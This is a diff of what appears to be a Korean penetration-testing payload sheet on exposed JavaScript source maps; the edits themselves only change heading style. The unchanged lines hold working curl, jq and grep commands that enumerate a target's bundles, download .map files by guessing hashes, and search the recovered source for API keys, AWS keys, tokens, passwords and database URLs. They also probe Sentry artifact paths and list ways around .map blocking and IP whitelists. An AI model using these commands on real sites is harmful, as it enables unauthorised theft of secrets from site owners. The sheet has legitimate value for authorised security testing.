@@ -1,6 +1,6 @@
 ### 정찰 페이로드
 
-**JS/CSS 파일 enumeration:**
+#### JS/CSS 파일 enumeration
 ```bash
 # HTML에서 JS/CSS URL 추출
 curl -s "https://target/" | grep -oP '(src|href)="[^"]*\.(js|css|mjs)"' | grep -oP '"[^"]*"' | tr -d '"'
@@ -10,7 +10,7 @@ curl -s "https://target/robots.txt"
 curl -s "https://target/sitemap.xml"
 ```
 
-**sourceMappingURL 확인:**
+#### sourceMappingURL 확인
 ```bash
 # 각 번들 마지막 주석
 curl -s "https://target/static/js/main.abc123.js" | tail -3
@@ -24,7 +24,7 @@ curl -s "https://target/static/js/main.js" | grep "sourceMappingURL=data:"
 
 ### 기본 페이로드
 
-**.map 파일 다운로드 시도:**
+#### .map 파일 다운로드 시도
 ```bash
 # 명시된 URL
 curl -o /tmp/map.json "https://target/static/js/main.abc123.js.map" -v
@@ -57,7 +57,7 @@ for hash in $(seq 1 5); do
 done
 ```
 
-**민감 정보 추출:**
+#### 민감 정보 추출
 ```bash
 # sourcesContent 필드 파싱 + 패턴 검색
 jq -r '.sourcesContent[]?' /tmp/map.json | grep -iE "apikey|api_key|secret|token|password|AKIA|aws_|mongodb://|postgres://|redis://|bearer "
@@ -72,7 +72,7 @@ jq -r '.sourcesContent[]?' /tmp/map.json | grep -oE 'process\.env\.[A-Z_]+ = "[^
 jq -r '.sources[]?' /tmp/map.json
 ```
 
-**Sentry/Datadog upload 확인:**
+#### Sentry/Datadog upload 확인
 ```bash
 # 일반적인 Sentry artifact 경로
 curl -sI "https://target/_sentry/artifacts/<sha256>"
@@ -96,7 +96,7 @@ curl -s "https://sentry.io/api/0/organizations/<org>/releases/<release>/files/"
 | HTTP 404 로깅 의존 | 정상 응답 코드로 위장 (CDN 설정 의존) |
 | 내부 IP 화이트리스트 | sourcemap server가 외부 노출되면 우회 |
 
-**다양한 path 변형:**
+#### 다양한 path 변형
 ```bash
 # 직접 .map 차단 시도
 GET /static/js/main.js.map      → 403
